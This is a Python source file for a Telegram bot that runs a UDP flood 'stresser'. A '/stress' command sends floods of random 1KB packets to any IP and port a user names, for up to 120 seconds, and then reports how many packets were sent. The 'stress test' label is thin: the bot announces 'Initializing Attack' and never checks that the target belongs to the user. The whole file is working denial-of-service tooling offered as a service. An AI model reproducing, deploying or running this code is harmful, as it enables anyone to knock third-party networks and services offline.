import os
import socket
import random
import time
import threading
from telebot import TeleBot
from dotenv import load_dotenv

# Load variables from .env file
load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
bot = TeleBot(TOKEN)

# --- Stresser Core ---
def udp_flood(target_ip, target_port, duration, chat_id, message_id):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_payload = random._urandom(1024) # 1KB packet
    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        try:
            client.sendto(bytes_payload, (target_ip, target_port))
            sent += 1
        except Exception:
            break
    
    # Final Render of the result
    final_text = (
        f"✅ **STRESS TEST COMPLETE**\n\n"
        f"🌐 **Target:** `{target_ip}:{target_port}`\n"
        f"📦 **Packets Sent:** `{sent}`\n"
        f"⏱ **Duration:** `{duration}s`"
    )
    bot.edit_message_text(final_text, chat_id, message_id, parse_mode='Markdown')

# --- Bot Commands ---
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Welcome. Use `/stress <IP> <Port> <Time>` to begin.")

@bot.message_handler(commands=['stress'])
def handle_stress(message):
    try:
        args = message.text.split()
        if len(args) != 4:
            raise ValueError

        ip = args[1]
        port = int(args[2])
        sec = int(args[3])

        if sec > 120:
            return bot.reply_to(message, "❌ Max duration is 120 seconds.")

        # Send initial "Rendering" message
        sent_msg = bot.reply_to(message, f"🚀 **Initializing Attack on {ip}...**", parse_mode='Markdown')

        # Launch stresser in a background thread
        threading.Thread(target=udp_flood, args=(ip, port, sec, message.chat.id, sent_msg.message_id)).start()

    except Exception:
        bot.reply_to(message, "⚠️ **Usage:** `/stress 1.1.1.1 80 30`")

if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()
